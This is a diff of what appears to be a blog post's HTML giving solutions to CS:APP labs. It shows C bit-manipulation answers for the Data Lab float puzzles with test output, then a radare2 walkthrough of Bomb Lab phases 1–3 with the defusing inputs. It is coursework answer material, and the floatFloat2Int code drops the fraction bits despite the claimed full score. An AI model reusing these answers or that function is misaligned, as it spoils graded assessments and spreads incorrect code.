+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;floatscale2&#34;&gt;floatScale2&lt;/h3&gt;
+&lt;p&gt;后面几个是浮点数相关操作&lt;/p&gt;
+&lt;p&gt;计算 &lt;code&gt;f*2&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * floatScale2 - Return bit-level equivalent of expression 2*f for
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   floating point argument f.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Both the argument and result are passed as unsigned int&amp;#39;s, but
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   they are to be interpreted as the bit-level representation of
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   single-precision floating point values.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   When argument is NaN, return argument
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Legal ops: Any integer/unsigned operations incl. ||, &amp;amp;&amp;amp;. also if, while
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Max ops: 30
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Rating: 4
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;floatScale2&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; uf) {
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; sign &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; uf &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((uf &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; uf;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (((uf &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; uf;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (((uf &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; uf &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (uf &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; sign) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; sign;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;floatfloat2int&#34;&gt;floatFloat2Int&lt;/h3&gt;
+&lt;p&gt;保留 f 的整数部分&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * floatFloat2Int - Return bit-level equivalent of expression (int) f
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   for floating point argument f.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Argument is passed as unsigned int, but
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   it is to be interpreted as the bit-level representation of a
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   single-precision floating point value.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Anything out of range (including NaN and infinity) should return
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   0x80000000u.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Legal ops: Any integer/unsigned operations incl. ||, &amp;amp;&amp;amp;. also if, while
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Max ops: 30
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Rating: 4
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;floatFloat2Int&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; uf) {
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((uf &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;127&lt;/span&gt;, sign &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; uf &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;, pow &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (e &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80000000&lt;/span&gt;;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (e &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+  pow &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; e;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (sign) pow &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;pow &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; pow;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;floatpower2&#34;&gt;floatPower2&lt;/h3&gt;
+&lt;p&gt;计算 $2.0^x$&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * floatPower2 - Return bit-level equivalent of the expression 2.0^x
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   (2.0 raised to the power x) for any 32-bit integer x.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   The unsigned value that is returned should have the identical bit
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   representation as the single-precision floating-point number 2.0^x.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   If the result is too small to be represented as a denorm, return
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   0. If too large, return +INF.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Legal ops: Any integer/unsigned operations incl. ||, &amp;amp;&amp;amp;. Also if, while 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Max ops: 30 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *   Rating: 4
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;floatPower2&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; x) {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7f&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x7e&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; 
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;127&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;result&#34;&gt;result&lt;/h3&gt;
+&lt;p&gt;先使用 &lt;code&gt;./dlc&lt;/code&gt; 验证使用的操作是否满足要求&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;$ ./dlc -e bits.c
+dlc:bits.c:147:bitXor: &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; operators
+dlc:bits.c:156:tmin: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; operators
+dlc:bits.c:167:isTmax: &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; operators
+dlc:bits.c:180:allOddBits: &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; operators
+dlc:bits.c:190:negate: &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; operators
+dlc:bits.c:203:isAsciiDigit: &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; operators
+dlc:bits.c:215:conditional: &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; operators
+dlc:bits.c:226:isLessOrEqual: &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; operators
+dlc:bits.c:239:logicalNeg: &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; operators
+dlc:bits.c:273:howManyBits: &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt; operators
+dlc:bits.c:292:floatScale2: &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; operators
+dlc:bits.c:312:floatFloat2Int: &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; operators
+dlc:bits.c:330:floatPower2: &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; operators
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;随后编译并执行 &lt;code&gt;./btest&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;$ make clean
+$ make btest
+$ ./btest
+Score   Rating  Errors  Function
+ &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       bitXor
+ &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       tmin
+ &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       isTmax
+ &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       allOddBits
+ &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       negate
+ &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       isAsciiDigit
+ &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       conditional
+ &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       isLessOrEqual
+ &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       logicalNeg
+ &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       howManyBits
+ &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       floatScale2
+ &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       floatFloat2Int
+ &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;      &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       floatPower2
+Total points: 36/36
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;lab2-bomb-lab&#34;&gt;Lab2 Bomb-lab&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Solve with radare2&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;phase-1&#34;&gt;Phase 1&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x00400da0]&amp;gt; s sym.phase_1
+[0x00400ee0]&amp;gt; pdf
+            ; CALL XREF from dbg.main @ 0x400e3a(x)
+┌ 28: sym.phase_1 (int64_t arg1);
+│           ; arg int64_t arg1 @ rdi
+│           0x00400ee0      4883ec08       sub rsp, 8
+│           0x00400ee4      be00244000     mov esi, str.Border_relations_with_Canada_have_never_been_better. ; 0x402400 ; &amp;quot;Border relations with Canada have never been better.&amp;quot; ; int64_t arg2
+│           0x00400ee9      e84a040000     call sym.strings_not_equal
+│           0x00400eee      85c0           test eax, eax
+│       ┌─&amp;lt; 0x00400ef0      7405           je 0x400ef7
+│       │   0x00400ef2      e843050000     call sym.explode_bomb
+│       │   ; CODE XREF from sym.phase_1 @ 0x400ef0(x)
+│       └─&amp;gt; 0x00400ef7      4883c408       add rsp, 8
+└           0x00400efb      c3             ret
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A simple strcmp&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Welcome to my fiendish little bomb. You have 6 phases with
+which to blow yourself up. Have a nice day!
+Border relations with Canada have never been better.
+Phase 1 defused. How about the next one?
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phase-2&#34;&gt;Phase 2&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x00400da0]&amp;gt; s sym.phase_2
+[0x00400efc]&amp;gt; pdf
+            ; CALL XREF from dbg.main @ 0x400e56(x)
+┌ 69: sym.phase_2 (const char *s);
+│           ; arg const char *s @ rdi
+│           ; var int64_t var_4h @ rsp+0x4
+│           ; var int64_t var_18h @ rsp+0x18
+│           0x00400efc      55             push rbp
+│           0x00400efd      53             push rbx
+│           0x00400efe      4883ec28       sub rsp, 0x28
+│           0x00400f02      4889e6         mov rsi, rsp                ; int64_t arg2
+│           0x00400f05      e852050000     call sym.read_six_numbers
+│           0x00400f0a      833c2401       cmp dword [rsp], 1
+│       ┌─&amp;lt; 0x00400f0e      7420           je 0x400f30
+│       │   0x00400f10      e825050000     call sym.explode_bomb
+..
+│      ││   ; CODE XREFS from sym.phase_2 @ 0x400f2c(x), 0x400f3a(x)
+│    ┌┌───&amp;gt; 0x00400f17      8b43fc         mov eax, dword [rbx - 4]
+│    ╎╎││   0x00400f1a      01c0           add eax, eax
+│    ╎╎││   0x00400f1c      3903           cmp dword [rbx], eax
+│   ┌─────&amp;lt; 0x00400f1e      7405           je 0x400f25
+│   │╎╎││   0x00400f20      e815050000     call sym.explode_bomb
+│   │╎╎││   ; CODE XREF from sym.phase_2 @ 0x400f1e(x)
+│   └─────&amp;gt; 0x00400f25      4883c304       add rbx, 4
+│    ╎╎││   0x00400f29      4839eb         cmp rbx, rbp
+│    └────&amp;lt; 0x00400f2c      75e9           jne 0x400f17
+│    ┌────&amp;lt; 0x00400f2e      eb0c           jmp 0x400f3c
+│    │╎││   ; CODE XREF from sym.phase_2 @ 0x400f0e(x)
+│    │╎││   ; CODE XREF from sym.phase_2 @ +0x19(x)
+│    │╎└└─&amp;gt; 0x00400f30      488d5c2404     lea rbx, [var_4h]
+│    │╎     0x00400f35      488d6c2418     lea rbp, [var_18h]
+│    │└───&amp;lt; 0x00400f3a      ebdb           jmp 0x400f17
+│    │      ; CODE XREF from sym.phase_2 @ 0x400f2e(x)
+│    └────&amp;gt; 0x00400f3c      4883c428       add rsp, 0x28
+│           0x00400f40      5b             pop rbx
+│           0x00400f41      5d             pop rbp
+└           0x00400f42      c3             ret
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;read_six_numbers()&lt;/code&gt; read from input string &lt;code&gt;char *s&lt;/code&gt; with format &lt;code&gt;%d %d %d %d %d %d&lt;/code&gt;, and saved numbers in an array on stack.&lt;/p&gt;
+&lt;p&gt;The first &lt;code&gt;cmp&lt;/code&gt; compare the first number with const int &lt;code&gt;1&lt;/code&gt;. After that, the program fall into a loop, which compare &lt;code&gt;array[cur]&lt;/code&gt; with &lt;code&gt;array[cur - 1] * 2&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Therefore, our input should be:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Phase 1 defused. How about the next one?
+1 2 4 8 16 32
+That&#39;s number 2.  Keep going!
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phase-3&#34;&gt;Phase 3&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x00400da0]&amp;gt; s sym.phase_3
+[0x00400f43]&amp;gt; pdf
+            ; CALL XREF from dbg.main @ 0x400e72(x)
+┌ 132: sym.phase_3 (const char *s);
+│           ; arg const char *s @ rdi
+│           ; var uint32_t var_8h @ rsp+0x8
+│           ; var uint32_t var_ch @ rsp+0xc
+│           0x00400f43      4883ec18       sub rsp, 0x18
+│           0x00400f47      488d4c240c     lea rcx, [var_ch]
+│           0x00400f4c      488d542408     lea rdx, [var_8h]           ;   ...
+│           0x00400f51      becf254000     mov esi, 0x4025cf           ; &amp;quot;%d %d&amp;quot; ; const char *format
+│           0x00400f56      b800000000     mov eax, 0
+│           0x00400f5b      e890fcffff     call sym.imp.__isoc99_sscanf ; int sscanf(const char *s, const char *format,   ...)
+│           0x00400f60      83f801         cmp eax, 1                  ; 1
+│       ┌─&amp;lt; 0x00400f63      7f05           jg 0x400f6a
+│       │   0x00400f65      e8d0040000     call sym.explode_bomb
+│       │   ; CODE XREF from sym.phase_3 @ 0x400f63(x)
+│       └─&amp;gt; 0x00400f6a      837c240807     cmp dword [var_8h], 7
+│       ┌─&amp;lt; 0x00400f6f      773c           ja case.default.0x400f75
+│       │   0x00400f71      8b442408       mov eax, dword [var_8h]
+│       │   ;-- switch
+│       │   0x00400f75      ff24c5702440.  jmp qword [rax*8 + 0x402470] ; &amp;quot;|\x0f@&amp;quot; ; switch table (8 cases) at 0x402470
+│       │   ;-- case 0:                                                ; from 0x00400f75
+│       │   ; CODE XREF from sym.phase_3 @ 0x400f75(x)
+│       │   0x00400f7c      b8cf000000     mov eax, 0xcf               ; 207
+│      ┌──&amp;lt; 0x00400f81      eb3b           jmp 0x400fbe
+│      ││   ;-- case 2:                                                ; from 0x00400f75
+│      ││   ; CODE XREF from sym.phase_3 @ 0x400f75(x)
+│      ││   0x00400f83      b8c3020000     mov eax, 0x2c3              ; 707
+│     ┌───&amp;lt; 0x00400f88      eb34           jmp 0x400fbe
+│     │││   ;-- case 3:                                                ; from 0x00400f75
+│     │││   ; CODE XREF from sym.phase_3 @ 0x400f75(x)
+│     │││   0x00400f8a      b800010000     mov eax, 0x100              ; 256
+│    ┌────&amp;lt; 0x00400f8f      eb2d           jmp 0x400fbe
+│    ││││   ;-- case 4:                                                ; from 0x00400f75
+│    ││││   ; CODE XREF from sym.phase_3 @ 0x400f75(x)
+│    ││││   0x00400f91      b885010000     mov eax, 0x185              ; 389
+│   ┌─────&amp;lt; 0x00400f96      eb26           jmp 0x400fbe
+│   │││││   ;-- case 5:                                                ; from 0x00400f75
+│   │││││   ; CODE XREF from sym.phase_3 @ 0x400f75(x)
+│   │││││   0x00400f98      b8ce000000     mov eax, 0xce               ; 206
+│  ┌──────&amp;lt; 0x00400f9d      eb1f           jmp 0x400fbe
+│  ││││││   ;-- case 6:                                                ; from 0x00400f75
+│  ││││││   ; CODE XREF from sym.phase_3 @ 0x400f75(x)
+│  ││││││   0x00400f9f      b8aa020000     mov eax, 0x2aa              ; 682
+│ ┌───────&amp;lt; 0x00400fa4      eb18           jmp 0x400fbe
+│ │││││││   ;-- case 7:                                                ; from 0x00400f75
+│ │││││││   ; CODE XREF from sym.phase_3 @ 0x400f75(x)
+│ │││││││   0x00400fa6      b847010000     mov eax, 0x147              ; 327
+│ ────────&amp;lt; 0x00400fab      eb11           jmp 0x400fbe
+│ │││││││   ;-- default:                                               ; from 0x400f75
+│ │││││││   ; CODE XREFS from sym.phase_3 @ 0x400f6f(x), 0x400f75(x)
+│ ││││││└─&amp;gt; 0x00400fad      e888040000     call sym.explode_bomb
+..
+│ │││││││   ;-- case 1:                                                ; from 0x00400f75
+│ │││││││   ; CODE XREF from sym.phase_3 @ 0x400f75(x)
+│ │││││││   0x00400fb9      b837010000     mov eax, 0x137              ; 311
+│ │││││││   ; XREFS: CODE 0x00400f81  CODE 0x00400f88  CODE 0x00400f8f  CODE 0x00400f96  CODE 0x00400f9d  CODE 0x00400fa4
+│ │││││││   ; XREFS: CODE 0x00400fab  CODE 0x00400fb7
+│ └└└└└└└─&amp;gt; 0x00400fbe      3b44240c       cmp eax, dword [var_ch]
+│       ┌─&amp;lt; 0x00400fc2      7405           je 0x400fc9
+│       │   0x00400fc4      e871040000     call sym.explode_bomb
+│       │   ; CODE XREF from sym.phase_3 @ 0x400fc2(x)
+│       └─&amp;gt; 0x00400fc9      4883c418       add rsp, 0x18
+└           0x00400fcd      c3             ret
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;First read 2 number from input (format is &lt;code&gt;%d %d&lt;/code&gt;), and save them in &lt;code&gt;[var_8h], [var_ch]&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Number 1 in &lt;code&gt;[var_8h]&lt;/code&gt; is used for a switch-case, and Number 2 in &lt;code&gt;[var_ch]&lt;/code&gt; is used to compare with eax which set in case.&lt;/p&gt;
+&lt;p&gt;Valid input:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;0 207
+1 311
+2 707
+3 256
+4 389
+5 206
+6 682
+7 327
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For example:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;That&#39;s number 2.  Keep going!
+7 327
+Halfway there!
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;phase-4&#34;&gt;Phase 4&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[0x00400da0]&amp;gt; s sym.phase_4
+[0x0040100c]&amp;gt; pdf
